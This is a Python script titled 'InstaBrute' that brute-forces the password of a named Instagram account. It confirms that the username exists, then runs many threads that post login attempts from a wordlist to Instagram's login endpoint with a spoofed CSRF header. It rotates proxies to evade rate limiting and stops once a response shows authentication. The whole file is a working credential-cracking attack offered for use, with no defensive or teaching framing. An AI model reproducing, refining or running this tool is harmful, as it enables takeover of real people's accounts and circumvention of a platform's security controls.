#!/usr/bin/env python3
import os, sys, time, random, argparse, requests, threading
from rich.console import Console
import instaloader
import distro

console = Console()
found = threading.Event()
proxy_list = []
password_queue = []
lock = threading.Lock()

def banner():
    console.print(r"""
[bold red]
██████╗ ███████╗██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║
██████╔╝█████╗  ██║  ██║██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝  ██║  ██║██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║
██║  ██║███████╗██████╔╝██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
[/bold red]""")
    console.print("[bold yellow]Kali GPT – InstaBrute Final Edition (Run Until Match)[/bold yellow]\n")

def system_info():
    console.print(f"[cyan]OS:[/cyan] {os.name} | [cyan]Distro:[/cyan] {distro.name(pretty=True)}")

def validate_instagram_user(username):
    try:
        loader = instaloader.Instaloader()
        instaloader.Profile.from_username(loader.context, username)
        console.print(f"[green][✔] Instagram username found: {username}[/green]")
    except instaloader.exceptions.ProfileNotExistsException:
        console.print(f"[red][✘] Instagram username not found: {username}[/red]")
        sys.exit(1)

def load_wordlist(wordlist_file):
    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def load_proxies(proxy_file):
    global proxy_list
    with open(proxy_file, "r") as f:
        proxy_list = [line.strip() for line in f if line.strip()]

def get_proxy():
    with lock:
        return random.choice(proxy_list) if proxy_list else None

def remove_proxy(proxy):
    with lock:
        if proxy in proxy_list:
            proxy_list.remove(proxy)
            console.print(f"[red][!] Removed bad proxy:[/red] {proxy}")

def attempt_login(url, username, password, proxy=None):
    if found.is_set():
        return

    proxy_cfg = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

    headers = {
        "User-Agent": "Mozilla/5.0",
        "X-CSRFToken": "missing",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.instagram.com/accounts/login/"
    }

    data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"
    }

    try:
        response = requests.post(url, data=data, headers=headers, proxies=proxy_cfg, timeout=10)

        if '"authenticated":true' in response.text:
            console.print(f"\n[bold green]✅ Password FOUND: {password}[/bold green]")
            found.set()
        else:
            console.print(f"[-] Tried: {password}")
    except Exception as e:
        console.print(f"[!] Proxy error: {proxy} — {type(e).__name__}")
        if proxy:
            remove_proxy(proxy)

def worker(url, username):
    while password_queue and not found.is_set():
        with lock:
            password = password_queue.pop(0)
        proxy = get_proxy()
        attempt_login(url, username, password, proxy)

def main():
    parser = argparse.ArgumentParser(description="InstaBrute FINAL | No thread stop until match")
    parser.add_argument("--url", required=True, help="Instagram login POST URL")
    parser.add_argument("--username", required=True, help="Instagram username")
    parser.add_argument("--wordlist", required=True, help="Password list")
    parser.add_argument("--proxies", help="Proxy file (optional)")
    parser.add_argument("--max", type=int, default=20, help="Max concurrent threads")
    args = parser.parse_args()

    banner()
    system_info()
    validate_instagram_user(args.username)

    global password_queue
    password_queue = load_wordlist(args.wordlist)

    if args.proxies:
        load_proxies(args.proxies)
        console.print(f"[cyan]Loaded proxies:[/cyan] {len(proxy_list)}")

    console.print(f"[bold magenta]Starting attack... {len(password_queue)} passwords to try[/bold magenta]")

    threads = []
    for _ in range(args.max):
        t = threading.Thread(target=worker, args=(args.url, args.username))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not found.is_set():
        console.print(f"\n[red]❌ No password matched in wordlist.[/red]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red][!] Interrupted.[/red]")
        sys.exit()
